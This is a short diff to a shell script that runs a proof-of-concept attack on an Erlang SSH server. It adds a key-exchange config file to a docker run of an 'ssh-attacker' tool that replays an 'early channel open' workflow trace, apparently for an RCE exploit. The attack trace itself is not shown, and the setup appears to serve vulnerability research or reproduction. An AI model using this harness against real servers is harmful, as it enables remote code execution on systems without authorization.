@@ -33,16 +33,19 @@ function start_erlang_ssh() {
 }
 
 function run_poc() {
+    POC_CONFIG="$ARTIFACTS_DIR/code/ssh_attacker/resources/configs/kex_ecdh_config.xml"
     POC_WORKFLOW_TRACE="$ARTIFACTS_DIR/code/pocs/erlang_rce/erlang_early_channel_open.xml"
     log "${GREEN}[+] Running PoC...${NC}"
     log "    - Server address: $SERVER_HOST:$SERVER_PORT"
     log "    - Workflow trace: $POC_WORKFLOW_TRACE"
     docker run --rm \
         -v "$POC_WORKFLOW_TRACE":/trace.xml \
+        -v "$POC_CONFIG":/config.xml \
         --network host \
         --name ssh-attacker \
         ssh-attacker:latest \
         -connect "$SERVER_HOST:$SERVER_PORT" \
+        -config /config.xml \
         -workflow_input /trace.xml |& tee -a $LOG_FILE
     log "${GREEN}[+] SSH-Attacker client run completed.${NC}"
     log "    - If the PoC was successful, you should see that the workflow trace was executed as planned in the tool's last output line."
